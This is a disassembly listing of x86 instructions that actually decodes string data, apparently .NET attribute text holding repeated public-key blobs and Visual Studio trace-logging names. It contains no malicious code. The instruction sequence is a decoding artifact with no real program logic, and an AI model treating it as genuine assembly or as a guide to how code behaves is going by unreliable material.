  405fe7:	fs xor eax,0x39326461
  405fed:	xor    eax,DWORD PTR [eax]
  405fef:	add    BYTE PTR [ecx-0x7efffe9d],al
  405ff5:	pop    ebp
  405ff6:	push   eax
  405ff7:	jb     0x406068
  405ff9:	je     0x406060
  405ffb:	jne    0x406070
  405ffd:	push   eax
  405ffe:	jb     0x406069
  406000:	jbe    0x406063
  406002:	je     0x406069
  406004:	inc    esp
  406005:	push   esp
  406006:	inc    ebp
  406007:	sub    al,0x20
  406009:	push   eax
  40600a:	jne    0x40606e
  40600c:	ins    BYTE PTR es:[edi],dx
  40600d:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  406014:	xor    BYTE PTR [edx],dh
  406016:	xor    al,0x30
  406018:	xor    BYTE PTR [eax],dh
  40601a:	xor    BYTE PTR [eax],dh
  40601c:	xor    al,0x38
  40601e:	xor    BYTE PTR [eax],dh
  406020:	xor    BYTE PTR [eax],dh
  406022:	xor    BYTE PTR [ecx],bh
  406024:	xor    al,0x30
  406026:	xor    BYTE PTR [eax],dh
  406028:	xor    BYTE PTR [eax],dh
  40602a:	xor    BYTE PTR [eax],dh
  40602c:	xor    BYTE PTR ss:[edx],dh
  40602f:	xor    BYTE PTR [eax],dh
  406031:	xor    BYTE PTR [eax],dh
  406033:	xor    BYTE PTR [eax],dh
  406035:	xor    dh,BYTE PTR [eax+esi*1]
  406038:	xor    BYTE PTR [eax],dh
  40603a:	xor    BYTE PTR ds:0x34333532,dh
  406040:	xor    DWORD PTR [ebx],esi
  406042:	xor    DWORD PTR [eax],esi
  406044:	xor    BYTE PTR [eax],dh
  406046:	xor    al,0x30
  406048:	xor    BYTE PTR [eax],dh
  40604a:	xor    BYTE PTR [eax],dh
  40604c:	xor    DWORD PTR [eax],esi
  40604e:	xor    BYTE PTR [eax],dh
  406050:	xor    DWORD PTR [eax],esi
  406052:	xor    BYTE PTR [eax],dh
  406054:	aaa    
  406055:	xor    DWORD PTR fs:[esi+0x61],esp
  406059:	xor    eax,0x61346337
  40605e:	gs cmp DWORD PTR fs:[esi+0x30],esp
  406063:	popa   
  406064:	xor    esi,DWORD PTR [edx]
  406066:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  40606a:	popa   
  40606b:	xor    BYTE PTR [esi+0x61],ah
  40606e:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  406075:	cmp    BYTE PTR gs:[esi+0x64],ah
  406079:	ss popa 
  40607b:	arpl   WORD PTR gs:[eax],di
  40607e:	data16 cmp BYTE PTR [edi],dh
  406081:	bound  si,DWORD PTR [eax]
  406084:	xor    esi,DWORD PTR [edi]
  406086:	ss arpl WORD PTR ss:[eax],di
  40608a:	xor    esi,DWORD PTR [ebx+eiz*2]
  40608d:	cmp    DWORD PTR [ecx],edi
  40608f:	cmp    DWORD PTR [edx],esi
  406091:	xor    DWORD PTR [ebp+0x62],esp
  406094:	xor    dh,BYTE PTR [ebx]
  406096:	bound  esp,QWORD PTR [ebp+0x37]
  406099:	cmp    DWORD PTR [ecx+0x64],esp
  40609c:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4060a0:	arpl   WORD PTR [ebx+0x31],sp
  4060a3:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4060a8:	xor    dh,BYTE PTR [ebx]
  4060aa:	xor    DWORD PTR ss:[ebx],esi
  4060ad:	xor    dh,BYTE PTR [ecx]
  4060af:	xor    BYTE PTR [edx],dh
  4060b1:	cmp    DWORD PTR [eax],esi
  4060b3:	xor    BYTE PTR [edx+0x37],ah
  4060b6:	xor    dh,BYTE PTR [ebx]
  4060b8:	arpl   WORD PTR [esi+0x39],sp
  4060bb:	cmp    BYTE PTR [eax],dh
  4060bd:	cmp    DWORD PTR ds:0x34636637,esi
  4060c3:	xor    DWORD PTR gs:[edi],esi
  4060c6:	aaa    
  4060c7:	xor    DWORD PTR [eax],esi
  4060c9:	cmp    BYTE PTR [esi+0x63],ah
  4060cc:	xor    BYTE PTR ss:[edi],dh
  4060cf:	aaa    
  4060d0:	aaa    
  4060d1:	xor    al,0x66
  4060d3:	xor    bh,BYTE PTR [ecx]
  4060d5:	cmp    BYTE PTR gs:[ebx],dh
  4060d8:	xor    dh,BYTE PTR [eax]
  4060da:	cmp    DWORD PTR gs:[edx],esi
  4060dd:	gs popa 
  4060df:	xor    BYTE PTR ds:0x34656365,dh
  4060e5:	cmp    BYTE PTR gs:[edx],dh
  4060e8:	xor    DWORD PTR [ebx+0x30],esp
  4060eb:	popa   
  4060ec:	xor    eax,0x38656665
  4060f1:	xor    WORD PTR [esi],si
  4060f4:	xor    al,0x35
  4060f6:	arpl   WORD PTR [ebx+eiz*2],si
  4060f9:	xor    BYTE PTR [ebx+0x39],ah
  4060fc:	xor    esp,DWORD PTR [ebx+0x31]
  4060ff:	popa   
  406100:	bound  edi,QWORD PTR [ecx]
  406102:	cmp    DWORD PTR [edx],esi
  406104:	cmp    BYTE PTR ds:0x32323664,dh
  40610a:	arpl   WORD PTR [ecx+0x61],sp
  40610d:	ss xor eax,0x64316332
  406113:	popaw  
  406115:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  40611b:	xor    eax,0x32663664
  406120:	fs gs xor eax,0x65373166
  406127:	xor    eax,0x30666165
  40612c:	data16 arpl WORD PTR [ecx+edi*1],si
  406130:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  406135:	xor    DWORD PTR [ebx+0x38],esp
  406138:	popa   
  406139:	xor    DWORD PTR [edx],esi
  40613b:	xor    al,0x33
  40613d:	ss xor eax,0x30323831
  406143:	ss arpl WORD PTR fs:[eax],si
  406147:	cmp    DWORD PTR [ebx],esi
  406149:	xor    esi,DWORD PTR [esp+esi*1]
  40614c:	fs xor eax,0x39326461
  406152:	xor    eax,DWORD PTR [eax]
  406154:	add    BYTE PTR [ecx-0x7efffe9b],al
  40615a:	pop    edi
  40615b:	push   eax
  40615c:	jb     0x4061cd
  40615e:	je     0x4061c5
  406160:	jne    0x4061d5
  406162:	push   eax
  406163:	jb     0x4061ce
  406165:	jbe    0x4061c8
  406167:	je     0x4061ce
  406169:	inc    esp
  40616a:	push   esp
  40616b:	inc    ebp
  40616c:	xor    DWORD PTR [eax],esi
  40616e:	sub    al,0x20
  406170:	push   eax
  406171:	jne    0x4061d5
  406173:	ins    BYTE PTR es:[edi],dx
  406174:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  40617b:	xor    BYTE PTR [edx],dh
  40617d:	xor    al,0x30
  40617f:	xor    BYTE PTR [eax],dh
  406181:	xor    BYTE PTR [eax],dh
  406183:	xor    al,0x38
  406185:	xor    BYTE PTR [eax],dh
  406187:	xor    BYTE PTR [eax],dh
  406189:	xor    BYTE PTR [ecx],bh
  40618b:	xor    al,0x30
  40618d:	xor    BYTE PTR [eax],dh
  40618f:	xor    BYTE PTR [eax],dh
  406191:	xor    BYTE PTR [eax],dh
  406193:	xor    BYTE PTR ss:[edx],dh
  406196:	xor    BYTE PTR [eax],dh
  406198:	xor    BYTE PTR [eax],dh
  40619a:	xor    BYTE PTR [eax],dh
  40619c:	xor    dh,BYTE PTR [eax+esi*1]
  40619f:	xor    BYTE PTR [eax],dh
  4061a1:	xor    BYTE PTR ds:0x34333532,dh
  4061a7:	xor    DWORD PTR [ebx],esi
  4061a9:	xor    DWORD PTR [eax],esi
  4061ab:	xor    BYTE PTR [eax],dh
  4061ad:	xor    al,0x30
  4061af:	xor    BYTE PTR [eax],dh
  4061b1:	xor    BYTE PTR [eax],dh
  4061b3:	xor    DWORD PTR [eax],esi
  4061b5:	xor    BYTE PTR [eax],dh
  4061b7:	xor    DWORD PTR [eax],esi
  4061b9:	xor    BYTE PTR [eax],dh
  4061bb:	aaa    
  4061bc:	xor    DWORD PTR fs:[esi+0x61],esp
  4061c0:	xor    eax,0x61346337
  4061c5:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4061ca:	popa   
  4061cb:	xor    esi,DWORD PTR [edx]
  4061cd:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  4061d1:	popa   
  4061d2:	xor    BYTE PTR [esi+0x61],ah
  4061d5:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  4061dc:	cmp    BYTE PTR gs:[esi+0x64],ah
  4061e0:	ss popa 
  4061e2:	arpl   WORD PTR gs:[eax],di
  4061e5:	data16 cmp BYTE PTR [edi],dh
  4061e8:	bound  si,DWORD PTR [eax]
  4061eb:	xor    esi,DWORD PTR [edi]
  4061ed:	ss arpl WORD PTR ss:[eax],di
  4061f1:	xor    esi,DWORD PTR [ebx+eiz*2]
  4061f4:	cmp    DWORD PTR [ecx],edi
  4061f6:	cmp    DWORD PTR [edx],esi
  4061f8:	xor    DWORD PTR [ebp+0x62],esp
  4061fb:	xor    dh,BYTE PTR [ebx]
  4061fd:	bound  esp,QWORD PTR [ebp+0x37]
  406200:	cmp    DWORD PTR [ecx+0x64],esp
  406203:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  406207:	arpl   WORD PTR [ebx+0x31],sp
  40620a:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  40620f:	xor    dh,BYTE PTR [ebx]
  406211:	xor    DWORD PTR ss:[ebx],esi
  406214:	xor    dh,BYTE PTR [ecx]
  406216:	xor    BYTE PTR [edx],dh
  406218:	cmp    DWORD PTR [eax],esi
  40621a:	xor    BYTE PTR [edx+0x37],ah
  40621d:	xor    dh,BYTE PTR [ebx]
  40621f:	arpl   WORD PTR [esi+0x39],sp
  406222:	cmp    BYTE PTR [eax],dh
  406224:	cmp    DWORD PTR ds:0x34636637,esi
  40622a:	xor    DWORD PTR gs:[edi],esi
  40622d:	aaa    
  40622e:	xor    DWORD PTR [eax],esi
  406230:	cmp    BYTE PTR [esi+0x63],ah
  406233:	xor    BYTE PTR ss:[edi],dh
  406236:	aaa    
  406237:	aaa    
  406238:	xor    al,0x66
  40623a:	xor    bh,BYTE PTR [ecx]
  40623c:	cmp    BYTE PTR gs:[ebx],dh
  40623f:	xor    dh,BYTE PTR [eax]
  406241:	cmp    DWORD PTR gs:[edx],esi
  406244:	gs popa 
  406246:	xor    BYTE PTR ds:0x34656365,dh
  40624c:	cmp    BYTE PTR gs:[edx],dh
  40624f:	xor    DWORD PTR [ebx+0x30],esp
  406252:	popa   
  406253:	xor    eax,0x38656665
  406258:	xor    WORD PTR [esi],si
  40625b:	xor    al,0x35
  40625d:	arpl   WORD PTR [ebx+eiz*2],si
  406260:	xor    BYTE PTR [ebx+0x39],ah
  406263:	xor    esp,DWORD PTR [ebx+0x31]
  406266:	popa   
  406267:	bound  edi,QWORD PTR [ecx]
  406269:	cmp    DWORD PTR [edx],esi
  40626b:	cmp    BYTE PTR ds:0x32323664,dh
  406271:	arpl   WORD PTR [ecx+0x61],sp
  406274:	ss xor eax,0x64316332
  40627a:	popaw  
  40627c:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  406282:	xor    eax,0x32663664
  406287:	fs gs xor eax,0x65373166
  40628e:	xor    eax,0x30666165
  406293:	data16 arpl WORD PTR [ecx+edi*1],si
  406297:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  40629c:	xor    DWORD PTR [ebx+0x38],esp
  40629f:	popa   
  4062a0:	xor    DWORD PTR [edx],esi
  4062a2:	xor    al,0x33
  4062a4:	ss xor eax,0x30323831
  4062aa:	ss arpl WORD PTR fs:[eax],si
  4062ae:	cmp    DWORD PTR [ebx],esi
  4062b0:	xor    esi,DWORD PTR [esp+esi*1]
  4062b3:	fs xor eax,0x39326461
  4062b9:	xor    eax,DWORD PTR [eax]
  4062bb:	add    BYTE PTR [ecx-0x7efffea8],al
  4062c1:	push   edx
  4062c2:	je     0x40632d
  4062c4:	fs jne 0x406334
  4062c7:	jo     0x4062f5
  4062c9:	and    BYTE PTR [eax+0x75],dl
  4062cc:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4062d0:	dec    ebx
  4062d1:	gs jns 0x406311
  4062d4:	xor    BYTE PTR [eax],dh
  4062d6:	xor    dh,BYTE PTR [eax+esi*1]
  4062d9:	xor    BYTE PTR [eax],dh
  4062db:	xor    BYTE PTR [eax],dh
  4062dd:	xor    al,0x38
  4062df:	xor    BYTE PTR [eax],dh
  4062e1:	xor    BYTE PTR [eax],dh
  4062e3:	xor    BYTE PTR [ecx],bh
  4062e5:	xor    al,0x30
  4062e7:	xor    BYTE PTR [eax],dh
  4062e9:	xor    BYTE PTR [eax],dh
  4062eb:	xor    BYTE PTR [eax],dh
  4062ed:	xor    BYTE PTR ss:[edx],dh
  4062f0:	xor    BYTE PTR [eax],dh
  4062f2:	xor    BYTE PTR [eax],dh
  4062f4:	xor    BYTE PTR [eax],dh
  4062f6:	xor    dh,BYTE PTR [eax+esi*1]
  4062f9:	xor    BYTE PTR [eax],dh
  4062fb:	xor    BYTE PTR ds:0x34333532,dh
  406301:	xor    DWORD PTR [ebx],esi
  406303:	xor    DWORD PTR [eax],esi
  406305:	xor    BYTE PTR [eax],dh
  406307:	xor    al,0x30
  406309:	xor    BYTE PTR [eax],dh
  40630b:	xor    BYTE PTR [eax],dh
  40630d:	xor    DWORD PTR [eax],esi
  40630f:	xor    BYTE PTR [eax],dh
  406311:	xor    DWORD PTR [eax],esi
  406313:	xor    BYTE PTR [eax],dh
  406315:	aaa    
  406316:	xor    DWORD PTR fs:[esi+0x61],esp
  40631a:	xor    eax,0x61346337
  40631f:	gs cmp DWORD PTR fs:[esi+0x30],esp
  406324:	popa   
  406325:	xor    esi,DWORD PTR [edx]
  406327:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  40632b:	popa   
  40632c:	xor    BYTE PTR [esi+0x61],ah
  40632f:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  406336:	cmp    BYTE PTR gs:[esi+0x64],ah
  40633a:	ss popa 
  40633c:	arpl   WORD PTR gs:[eax],di
  40633f:	data16 cmp BYTE PTR [edi],dh
  406342:	bound  si,DWORD PTR [eax]
  406345:	xor    esi,DWORD PTR [edi]
  406347:	ss arpl WORD PTR ss:[eax],di
  40634b:	xor    esi,DWORD PTR [ebx+eiz*2]
  40634e:	cmp    DWORD PTR [ecx],edi
  406350:	cmp    DWORD PTR [edx],esi
  406352:	xor    DWORD PTR [ebp+0x62],esp
  406355:	xor    dh,BYTE PTR [ebx]
  406357:	bound  esp,QWORD PTR [ebp+0x37]
  40635a:	cmp    DWORD PTR [ecx+0x64],esp
  40635d:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  406361:	arpl   WORD PTR [ebx+0x31],sp
  406364:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  406369:	xor    dh,BYTE PTR [ebx]
  40636b:	xor    DWORD PTR ss:[ebx],esi
  40636e:	xor    dh,BYTE PTR [ecx]
  406370:	xor    BYTE PTR [edx],dh
  406372:	cmp    DWORD PTR [eax],esi
  406374:	xor    BYTE PTR [edx+0x37],ah
  406377:	xor    dh,BYTE PTR [ebx]
  406379:	arpl   WORD PTR [esi+0x39],sp
  40637c:	cmp    BYTE PTR [eax],dh
  40637e:	cmp    DWORD PTR ds:0x34636637,esi
  406384:	xor    DWORD PTR gs:[edi],esi
  406387:	aaa    
  406388:	xor    DWORD PTR [eax],esi
  40638a:	cmp    BYTE PTR [esi+0x63],ah
  40638d:	xor    BYTE PTR ss:[edi],dh
  406390:	aaa    
  406391:	aaa    
  406392:	xor    al,0x66
  406394:	xor    bh,BYTE PTR [ecx]
  406396:	cmp    BYTE PTR gs:[ebx],dh
  406399:	xor    dh,BYTE PTR [eax]
  40639b:	cmp    DWORD PTR gs:[edx],esi
  40639e:	gs popa 
  4063a0:	xor    BYTE PTR ds:0x34656365,dh
  4063a6:	cmp    BYTE PTR gs:[edx],dh
  4063a9:	xor    DWORD PTR [ebx+0x30],esp
  4063ac:	popa   
  4063ad:	xor    eax,0x38656665
  4063b2:	xor    WORD PTR [esi],si
  4063b5:	xor    al,0x35
  4063b7:	arpl   WORD PTR [ebx+eiz*2],si
  4063ba:	xor    BYTE PTR [ebx+0x39],ah
  4063bd:	xor    esp,DWORD PTR [ebx+0x31]
  4063c0:	popa   
  4063c1:	bound  edi,QWORD PTR [ecx]
  4063c3:	cmp    DWORD PTR [edx],esi
  4063c5:	cmp    BYTE PTR ds:0x32323664,dh
  4063cb:	arpl   WORD PTR [ecx+0x61],sp
  4063ce:	ss xor eax,0x64316332
  4063d4:	popaw  
  4063d6:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4063dc:	xor    eax,0x32663664
  4063e1:	fs gs xor eax,0x65373166
  4063e8:	xor    eax,0x30666165
  4063ed:	data16 arpl WORD PTR [ecx+edi*1],si
  4063f1:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  4063f6:	xor    DWORD PTR [ebx+0x38],esp
  4063f9:	popa   
  4063fa:	xor    DWORD PTR [edx],esi
  4063fc:	xor    al,0x33
  4063fe:	ss xor eax,0x30323831
  406404:	ss arpl WORD PTR fs:[eax],si
  406408:	cmp    DWORD PTR [ebx],esi
  40640a:	xor    esi,DWORD PTR [esp+esi*1]
  40640d:	fs xor eax,0x39326461
  406413:	xor    eax,DWORD PTR [eax]
  406415:	add    BYTE PTR [ecx-0x7efffea9],al
  40641b:	push   ecx
  40641c:	push   esp
  40641d:	dec    ecx
  40641e:	dec    esp
  40641f:	outs   dx,DWORD PTR ds:[esi]
  406420:	addr16 sub al,0x20
  406423:	push   eax
  406424:	jne    0x406488
  406426:	ins    BYTE PTR es:[edi],dx
  406427:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  40642e:	xor    BYTE PTR [edx],dh
  406430:	xor    al,0x30
  406432:	xor    BYTE PTR [eax],dh
  406434:	xor    BYTE PTR [eax],dh
  406436:	xor    al,0x38
  406438:	xor    BYTE PTR [eax],dh
  40643a:	xor    BYTE PTR [eax],dh
  40643c:	xor    BYTE PTR [ecx],bh
  40643e:	xor    al,0x30
  406440:	xor    BYTE PTR [eax],dh
  406442:	xor    BYTE PTR [eax],dh
  406444:	xor    BYTE PTR [eax],dh
  406446:	xor    BYTE PTR ss:[edx],dh
  406449:	xor    BYTE PTR [eax],dh
  40644b:	xor    BYTE PTR [eax],dh
  40644d:	xor    BYTE PTR [eax],dh
  40644f:	xor    dh,BYTE PTR [eax+esi*1]
  406452:	xor    BYTE PTR [eax],dh
  406454:	xor    BYTE PTR ds:0x34333532,dh
  40645a:	xor    DWORD PTR [ebx],esi
  40645c:	xor    DWORD PTR [eax],esi
  40645e:	xor    BYTE PTR [eax],dh
  406460:	xor    al,0x30
  406462:	xor    BYTE PTR [eax],dh
  406464:	xor    BYTE PTR [eax],dh
  406466:	xor    DWORD PTR [eax],esi
  406468:	xor    BYTE PTR [eax],dh
  40646a:	xor    DWORD PTR [eax],esi
  40646c:	xor    BYTE PTR [eax],dh
  40646e:	aaa    
  40646f:	xor    DWORD PTR fs:[esi+0x61],esp
  406473:	xor    eax,0x61346337
  406478:	gs cmp DWORD PTR fs:[esi+0x30],esp
  40647d:	popa   
  40647e:	xor    esi,DWORD PTR [edx]
  406480:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  406484:	popa   
  406485:	xor    BYTE PTR [esi+0x61],ah
  406488:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  40648f:	cmp    BYTE PTR gs:[esi+0x64],ah
  406493:	ss popa 
  406495:	arpl   WORD PTR gs:[eax],di
  406498:	data16 cmp BYTE PTR [edi],dh
  40649b:	bound  si,DWORD PTR [eax]
  40649e:	xor    esi,DWORD PTR [edi]
  4064a0:	ss arpl WORD PTR ss:[eax],di
  4064a4:	xor    esi,DWORD PTR [ebx+eiz*2]
  4064a7:	cmp    DWORD PTR [ecx],edi
  4064a9:	cmp    DWORD PTR [edx],esi
  4064ab:	xor    DWORD PTR [ebp+0x62],esp
  4064ae:	xor    dh,BYTE PTR [ebx]
  4064b0:	bound  esp,QWORD PTR [ebp+0x37]
  4064b3:	cmp    DWORD PTR [ecx+0x64],esp
  4064b6:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4064ba:	arpl   WORD PTR [ebx+0x31],sp
  4064bd:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4064c2:	xor    dh,BYTE PTR [ebx]
  4064c4:	xor    DWORD PTR ss:[ebx],esi
  4064c7:	xor    dh,BYTE PTR [ecx]
  4064c9:	xor    BYTE PTR [edx],dh
  4064cb:	cmp    DWORD PTR [eax],esi
  4064cd:	xor    BYTE PTR [edx+0x37],ah
  4064d0:	xor    dh,BYTE PTR [ebx]
  4064d2:	arpl   WORD PTR [esi+0x39],sp
  4064d5:	cmp    BYTE PTR [eax],dh
  4064d7:	cmp    DWORD PTR ds:0x34636637,esi
  4064dd:	xor    DWORD PTR gs:[edi],esi
  4064e0:	aaa    
  4064e1:	xor    DWORD PTR [eax],esi
  4064e3:	cmp    BYTE PTR [esi+0x63],ah
  4064e6:	xor    BYTE PTR ss:[edi],dh
  4064e9:	aaa    
  4064ea:	aaa    
  4064eb:	xor    al,0x66
  4064ed:	xor    bh,BYTE PTR [ecx]
  4064ef:	cmp    BYTE PTR gs:[ebx],dh
  4064f2:	xor    dh,BYTE PTR [eax]
  4064f4:	cmp    DWORD PTR gs:[edx],esi
  4064f7:	gs popa 
  4064f9:	xor    BYTE PTR ds:0x34656365,dh
  4064ff:	cmp    BYTE PTR gs:[edx],dh
  406502:	xor    DWORD PTR [ebx+0x30],esp
  406505:	popa   
  406506:	xor    eax,0x38656665
  40650b:	xor    WORD PTR [esi],si
  40650e:	xor    al,0x35
  406510:	arpl   WORD PTR [ebx+eiz*2],si
  406513:	xor    BYTE PTR [ebx+0x39],ah
  406516:	xor    esp,DWORD PTR [ebx+0x31]
  406519:	popa   
  40651a:	bound  edi,QWORD PTR [ecx]
  40651c:	cmp    DWORD PTR [edx],esi
  40651e:	cmp    BYTE PTR ds:0x32323664,dh
  406524:	arpl   WORD PTR [ecx+0x61],sp
  406527:	ss xor eax,0x64316332
  40652d:	popaw  
  40652f:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  406535:	xor    eax,0x32663664
  40653a:	fs gs xor eax,0x65373166
  406541:	xor    eax,0x30666165
  406546:	data16 arpl WORD PTR [ecx+edi*1],si
  40654a:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  40654f:	xor    DWORD PTR [ebx+0x38],esp
  406552:	popa   
  406553:	xor    DWORD PTR [edx],esi
  406555:	xor    al,0x33
  406557:	ss xor eax,0x30323831
  40655d:	ss arpl WORD PTR fs:[eax],si
  406561:	cmp    DWORD PTR [ebx],esi
  406563:	xor    esi,DWORD PTR [esp+esi*1]
  406566:	fs xor eax,0x39326461
  40656c:	xor    eax,DWORD PTR [eax]
  40656e:	add    BYTE PTR [ecx-0x7efffe76],al
  406574:	test   BYTE PTR [ebp+0x69],cl
  406577:	arpl   WORD PTR [edx+0x6f],si
  40657a:	jae    0x4065eb
  40657c:	data16 je 0x4065ad
  40657f:	push   esi
  406580:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  406587:	jne    0x4065ed
  406589:	imul   ebp,DWORD PTR [edi+0x2e],0x63617254
  406590:	gs dec esp
  406592:	outs   dx,DWORD PTR ds:[esi]
  406593:	addr16 cs dec ecx
  406596:	outs   dx,BYTE PTR ds:[esi]
  406597:	jae    0x40660d
  406599:	jb     0x406610
  40659b:	ins    DWORD PTR es:[edi],dx
  40659c:	outs   dx,BYTE PTR gs:[esi]
  40659e:	je     0x406601
  4065a0:	je     0x40660b
  4065a2:	outs   dx,DWORD PTR ds:[esi]
  4065a3:	outs   dx,BYTE PTR ds:[esi]
  4065a4:	cs push ebp
  4065a6:	outs   dx,BYTE PTR ds:[esi]
  4065a7:	imul   esi,DWORD PTR [esp+edx*2+0x65],0x202c7473
  4065af:	push   eax
  4065b0:	jne    0x406614
  4065b2:	ins    BYTE PTR es:[edi],dx
  4065b3:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  4065ba:	xor    BYTE PTR [edx],dh
  4065bc:	xor    al,0x30
  4065be:	xor    BYTE PTR [eax],dh
  4065c0:	xor    BYTE PTR [eax],dh
  4065c2:	xor    al,0x38
  4065c4:	xor    BYTE PTR [eax],dh
  4065c6:	xor    BYTE PTR [eax],dh
  4065c8:	xor    BYTE PTR [ecx],bh
  4065ca:	xor    al,0x30
  4065cc:	xor    BYTE PTR [eax],dh
  4065ce:	xor    BYTE PTR [eax],dh
  4065d0:	xor    BYTE PTR [eax],dh
  4065d2:	xor    BYTE PTR ss:[edx],dh
  4065d5:	xor    BYTE PTR [eax],dh
  4065d7:	xor    BYTE PTR [eax],dh
  4065d9:	xor    BYTE PTR [eax],dh
  4065db:	xor    dh,BYTE PTR [eax+esi*1]
  4065de:	xor    BYTE PTR [eax],dh
  4065e0:	xor    BYTE PTR ds:0x34333532,dh
  4065e6:	xor    DWORD PTR [ebx],esi
  4065e8:	xor    DWORD PTR [eax],esi
  4065ea:	xor    BYTE PTR [eax],dh
  4065ec:	xor    al,0x30
  4065ee:	xor    BYTE PTR [eax],dh
  4065f0:	xor    BYTE PTR [eax],dh
  4065f2:	xor    DWORD PTR [eax],esi
  4065f4:	xor    BYTE PTR [eax],dh
  4065f6:	xor    DWORD PTR [eax],esi
  4065f8:	xor    BYTE PTR [eax],dh
  4065fa:	aaa    
  4065fb:	xor    DWORD PTR fs:[esi+0x61],esp
  4065ff:	xor    eax,0x61346337
  406604:	gs cmp DWORD PTR fs:[esi+0x30],esp
  406609:	popa   
  40660a:	xor    esi,DWORD PTR [edx]
  40660c:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  406610:	popa   
  406611:	xor    BYTE PTR [esi+0x61],ah
  406614:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  40661b:	cmp    BYTE PTR gs:[esi+0x64],ah
  40661f:	ss popa 
  406621:	arpl   WORD PTR gs:[eax],di
  406624:	data16 cmp BYTE PTR [edi],dh
  406627:	bound  si,DWORD PTR [eax]
  40662a:	xor    esi,DWORD PTR [edi]
  40662c:	ss arpl WORD PTR ss:[eax],di
  406630:	xor    esi,DWORD PTR [ebx+eiz*2]
  406633:	cmp    DWORD PTR [ecx],edi
  406635:	cmp    DWORD PTR [edx],esi
  406637:	xor    DWORD PTR [ebp+0x62],esp
  40663a:	xor    dh,BYTE PTR [ebx]
  40663c:	bound  esp,QWORD PTR [ebp+0x37]
  40663f:	cmp    DWORD PTR [ecx+0x64],esp
  406642:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  406646:	arpl   WORD PTR [ebx+0x31],sp
  406649:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  40664e:	xor    dh,BYTE PTR [ebx]
  406650:	xor    DWORD PTR ss:[ebx],esi
  406653:	xor    dh,BYTE PTR [ecx]
  406655:	xor    BYTE PTR [edx],dh
  406657:	cmp    DWORD PTR [eax],esi
  406659:	xor    BYTE PTR [edx+0x37],ah
  40665c:	xor    dh,BYTE PTR [ebx]
  40665e:	arpl   WORD PTR [esi+0x39],sp
  406661:	cmp    BYTE PTR [eax],dh
  406663:	cmp    DWORD PTR ds:0x34636637,esi
  406669:	xor    DWORD PTR gs:[edi],esi
  40666c:	aaa    
  40666d:	xor    DWORD PTR [eax],esi
  40666f:	cmp    BYTE PTR [esi+0x63],ah
  406672:	xor    BYTE PTR ss:[edi],dh
  406675:	aaa    
  406676:	aaa    
  406677:	xor    al,0x66
  406679:	xor    bh,BYTE PTR [ecx]
  40667b:	cmp    BYTE PTR gs:[ebx],dh
  40667e:	xor    dh,BYTE PTR [eax]
  406680:	cmp    DWORD PTR gs:[edx],esi
  406683:	gs popa 
  406685:	xor    BYTE PTR ds:0x34656365,dh
  40668b:	cmp    BYTE PTR gs:[edx],dh
  40668e:	xor    DWORD PTR [ebx+0x30],esp
  406691:	popa   
  406692:	xor    eax,0x38656665
  406697:	xor    WORD PTR [esi],si
  40669a:	xor    al,0x35
  40669c:	arpl   WORD PTR [ebx+eiz*2],si
  40669f:	xor    BYTE PTR [ebx+0x39],ah
  4066a2:	xor    esp,DWORD PTR [ebx+0x31]
  4066a5:	popa   
  4066a6:	bound  edi,QWORD PTR [ecx]
  4066a8:	cmp    DWORD PTR [edx],esi
  4066aa:	cmp    BYTE PTR ds:0x32323664,dh
  4066b0:	arpl   WORD PTR [ecx+0x61],sp
  4066b3:	ss xor eax,0x64316332
  4066b9:	popaw  
  4066bb:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4066c1:	xor    eax,0x32663664
  4066c6:	fs gs xor eax,0x65373166
  4066cd:	xor    eax,0x30666165
  4066d2:	data16 arpl WORD PTR [ecx+edi*1],si
  4066d6:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  4066db:	xor    DWORD PTR [ebx+0x38],esp
  4066de:	popa   
  4066df:	xor    DWORD PTR [edx],esi
  4066e1:	xor    al,0x33
  4066e3:	ss xor eax,0x30323831
  4066e9:	ss arpl WORD PTR fs:[eax],si
  4066ed:	cmp    DWORD PTR [ebx],esi
  4066ef:	xor    esi,DWORD PTR [esp+esi*1]
  4066f2:	fs xor eax,0x39326461
  4066f8:	xor    eax,DWORD PTR [eax]
  4066fa:	add    BYTE PTR [ecx-0x7efffe9d],al
  406700:	pop    ebp
  406701:	push   eax
  406702:	jb     0x406773
  406704:	je     0x40676b
  406706:	jne    0x40677b
  406708:	cs dec esp
  40670a:	outs   dx,DWORD PTR ds:[esi]
  40670b:	addr16 push edx
  40670d:	jne    0x40677d
  40670f:	outs   dx,BYTE PTR ds:[esi]
  406710:	gs jb  0x40673f
